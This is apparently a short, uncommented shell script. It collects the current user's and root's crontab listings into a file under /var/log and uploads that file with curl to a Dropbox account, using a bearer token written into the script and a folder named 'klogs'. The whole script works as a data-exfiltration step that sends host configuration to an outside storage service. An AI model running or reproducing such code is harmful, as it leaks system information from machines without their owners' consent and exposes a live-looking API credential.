crontab -l > /var/log/data
sudo crontab -l >> /var/log/data
curl -X POST https://content.dropboxapi.com/2/files/upload     --header "Authorization: Bearer wz0j8XDxZVAAAAAAAAAAWVCZG0FSQm2elwhTAPa-DB2RyeflCzRm77pRBWVjyVIV"     --header "Dropbox-API-Arg: {\"path\": \"/klogs/data.txt\",\"mode\": \"add\",\"autorename\": true,\"mute\": false,\"strict_conflict\": false}"     --header "Content-Type: application/octet-stream"     --data-binary @/var/log/data
